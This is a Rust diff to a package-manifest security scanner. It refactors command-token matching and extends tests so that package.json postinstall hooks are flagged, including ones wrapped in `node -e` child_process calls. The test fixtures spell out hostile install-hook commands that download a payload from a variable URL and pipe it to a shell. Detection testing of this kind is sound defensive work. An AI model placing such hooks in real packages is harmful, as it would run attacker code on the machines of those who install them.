@@ -6,6 +6,7 @@ use serde_json::Value;
 use std::path::{Path, PathBuf};
 
 use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
+use crate::detectors::patterns::line_contains_command_token;
 use crate::findings::{
     ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
 };
@@ -198,7 +199,7 @@ fn package_json_install_hook_is_risky(command: &str) -> bool {
     package_json_install_hook_has_network(command)
         || lower_command
             .lines()
-            .any(|line| command_token_with_boundary(line, "powershell"))
+            .any(|line| line_contains_command_token(line, "powershell"))
         || lower_command.lines().any(|line| {
             INSTALL_HOOK_EXEC_COMMAND_ARGS
                 .iter()
@@ -211,41 +212,9 @@ fn package_json_install_hook_has_network(command: &str) -> bool {
     lower_command.lines().any(|line| {
         INSTALL_HOOK_NETWORK_COMMAND_TOKENS
             .iter()
-            .any(|token| command_token_with_boundary(line, token))
+            .any(|token| line_contains_command_token(line, token))
     }) || lower_command.contains("http://")
         || lower_command.contains("https://")
-}
-
-fn command_token_with_boundary(line: &str, token: &str) -> bool {
-    let mut start = 0;
-    while let Some(pos) = line[start..].find(token) {
-        let abs_pos = start + pos;
-        let token_end = abs_pos + token.len();
-        let before = if abs_pos > 0 {
-            line.as_bytes().get(abs_pos - 1)
-        } else {
-            None
-        };
-        let left_ok = before.is_none()
-            || matches!(
-                before,
-                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'/')
-            );
-        let after = line.get(token_end..).unwrap_or("");
-        let right_ok = after.is_empty()
-            || after.starts_with(' ')
-            || after.starts_with('\t')
-            || after.starts_with('|')
-            || after.starts_with(';')
-            || after.starts_with('&')
-            || after.starts_with('>')
-            || after.starts_with('<');
-        if left_ok && right_ok {
-            return true;
-        }
-        start = token_end;
-    }
-    false
 }
 
 fn command_token_followed_by_arg(line: &str, command: &str, arg: &str) -> bool {
@@ -586,6 +555,7 @@ mod tests {
             "curl\t$PAYLOAD_URL | sh",
             "/usr/bin/wget\t$PAYLOAD_URL -O payload.sh",
             "iwr\t$PAYLOAD_URL -OutFile payload.ps1",
+            "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"",
         ] {
             let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
             let caps = package_json_capabilities(&manifest);
@@ -615,14 +585,19 @@ mod tests {
     /// Downloader matching must not fire on command-name substrings.
     #[test]
     fn package_json_capabilities_rejects_download_command_substrings() {
-        let manifest = r#"{"name":"x","scripts":{"postinstall":"mycurl\t$PAYLOAD_URL"}}"#;
+        for command in [
+            "mycurl\t$PAYLOAD_URL",
+            "node -e \"require('child_process').exec('mycurl\t$PAYLOAD_URL')\"",
+        ] {
+            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
 
-        let caps = package_json_capabilities(manifest);
+            let caps = package_json_capabilities(&manifest);
 
-        assert!(!capability_present(
-            &caps,
-            ArtifactCapability::NetworkAccess
-        ));
+            assert!(
+                !capability_present(&caps, ArtifactCapability::NetworkAccess),
+                "lookalike downloader must not raise NetworkAccess for {command:?}; got {caps:?}",
+            );
+        }
     }
 
     /// Contract: install-hook URLs become Downloads edges for taint and
@@ -647,11 +622,19 @@ mod tests {
     /// capability-combo analysis.
     #[test]
     fn package_json_relations_records_remote_resource_for_boundary_download_hook() {
-        let manifest = r#"{"name":"x","scripts":{"postinstall":"curl\t$PAYLOAD_URL | sh"}}"#;
+        for command in [
+            "curl\t$PAYLOAD_URL | sh",
+            "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"",
+        ] {
+            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
 
-        let links = package_json_relations(manifest);
+            let links = package_json_relations(&manifest);
 
-        assert!(download_relation_target_present(&links, "remote-resource"));
+            assert!(
+                download_relation_target_present(&links, "remote-resource"),
+                "variable-sourced downloader must record remote-resource for {command:?}; got {links:?}",
+            );
+        }
     }
 
     /// Contract: plain install hooks do not invent Downloads edges.
@@ -686,20 +669,30 @@ mod tests {
     /// the command does not contain a literal URL.
     #[test]
     fn analyze_package_json_marks_boundary_download_hook_risky() {
-        let manifest = r#"{"name":"x","scripts":{"postinstall":"curl\t$PAYLOAD_URL | sh"}}"#;
-        let path = std::path::Path::new("/pkg/package.json");
-        let service = ArtifactOrchestratorService::new();
-        let findings = analyze_package_json(&service, path, manifest, &[]);
+        for command in [
+            "curl\t$PAYLOAD_URL | sh",
+            "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"",
+        ] {
+            let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
+            let path = std::path::Path::new("/pkg/package.json");
+            let service = ArtifactOrchestratorService::new();
+            let findings = analyze_package_json(&service, path, &manifest, &[]);
 
-        let install_hook_finding = findings
-            .iter()
-            .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
-            .expect("postinstall hook must raise an install-hook finding");
-        assert_eq!(install_hook_finding.severity, Severity::Medium);
-        assert_eq!(
-            install_hook_finding.recommended_action,
-            RecommendedAction::RequireApproval,
-        );
+            let install_hook_finding = findings
+                .iter()
+                .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
+                .expect("postinstall hook must raise an install-hook finding");
+            assert_eq!(
+                install_hook_finding.severity,
+                Severity::Medium,
+                "{command:?} must be a risky install hook",
+            );
+            assert_eq!(
+                install_hook_finding.recommended_action,
+                RecommendedAction::RequireApproval,
+                "{command:?} must require approval",
+            );
+        }
     }
 
     /// # Contract
